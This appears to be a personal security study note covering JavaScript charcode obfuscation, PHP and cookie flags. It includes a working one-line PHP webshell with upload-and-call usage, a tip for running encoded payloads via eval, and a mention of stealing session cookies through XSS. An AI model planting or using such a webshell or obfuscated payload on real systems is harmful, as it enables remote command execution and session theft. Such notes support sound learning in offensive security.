**Tags:** #type/tech-specific 

---
# Javascript
`String.fromCharCode()`expects decimal charcodes --> when using [[3 Tools/defensive/Cyberchef|Cyberchef]], use base 10

use `eval(String.fromCharCode()) to execute encoded payload
# PHP
simple php webshell: `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
	takes shell command in the URL: upload file and then use `[url to file]?cmd=<command>`

# Cookies
^30cd96
## Relevant cookie flags
- `Secure`: Cookie can only be sent over encrypted connections
- `HttpOnly`: Browser denys javascript access to the cookie
	- If not set, the cookie can be read by javascript - e.g. to [[#^c0c94a|steal a session cookie]] using [[2 Tech-Specifics/Web/OWASP TOP 10/XSS Fundamentals|XSS Fundamentals]]
